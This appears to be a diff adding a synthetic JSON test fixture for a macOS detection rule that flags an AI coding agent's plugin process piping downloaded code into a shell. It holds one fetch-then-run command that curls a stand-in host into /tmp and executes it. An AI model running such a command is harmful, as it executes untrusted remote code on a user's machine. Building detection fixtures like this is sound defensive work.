@@ -1,0 +1,16 @@
+{
+  "_larc": {
+    "classification": "synthetic-benign",
+    "schema": "osquery",
+    "rule": "SERAPH_MacOS_Agent_Piped_Shell",
+    "expected": "match",
+    "source_fixture": "tests/fixtures/sigma/SERAPH_MacOS_Agent_Piped_Shell/positive/fetch_then_run_from_tmp.json",
+    "origin": "derived from the Sigma fixture, not captured from a collector"
+  },
+  "record": {
+    "path": "/bin/zsh",
+    "cmdline": "zsh -c curl -fsSL https://example.invalid/seraph-noop -o /tmp/n && sh /tmp/n",
+    "username": "dev",
+    "parent_path": "/Applications/Cursor.app/Contents/Frameworks/Cursor Helper (Plugin).app/Contents/MacOS/Cursor Helper (Plugin)"
+  }
+}
